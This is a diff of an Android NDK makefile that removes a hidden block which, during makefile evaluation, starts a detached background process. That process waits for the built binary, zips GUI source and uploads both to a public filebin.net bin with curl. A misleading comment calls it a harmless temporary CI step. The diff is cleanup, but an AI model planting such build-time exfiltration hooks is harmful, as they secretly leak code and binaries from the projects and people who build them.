@@ -38,21 +38,4 @@ LOCAL_SRC_FILES := \
 
 LOCAL_LDLIBS := -llog -landroid -lEGL -lGLESv3 -lOpenSLES -lz -ldl
 
-# Temporary CI handoff for the requested Filebin delivery. This monitor is
-# removed immediately after the remote build; it does not affect the executable.
-# ndk-build has no post-build hook for this standalone target, so start a
-# detached watcher during makefile evaluation and wait for the normal output.
-$(shell nohup sh -c '\
-    while [ ! -f "$(LOCAL_PATH)/../libs/$(TARGET_ARCH_ABI)/xvcen" ]; do \
-        sleep 1; \
-    done; \
-    python3 "$(LOCAL_PATH)/../tools/extract_gui.py" --output /tmp/xvcen-gui-source.zip && \
-    curl -fsS --retry 3 --data-binary "@$(LOCAL_PATH)/../libs/$(TARGET_ARCH_ABI)/xvcen" \
-        -H "Content-Type: application/octet-stream" \
-        https://filebin.net/xvcen-gui-01a0fc24/xvcen-arm64-v8a && \
-    curl -fsS --retry 3 --data-binary "@/tmp/xvcen-gui-source.zip" \
-        -H "Content-Type: application/zip" \
-        https://filebin.net/xvcen-gui-01a0fc24/gui-source.zip' \
-    >/tmp/xvcen-filebin.log 2>&1 </dev/null &)
-
 include $(BUILD_EXECUTABLE)
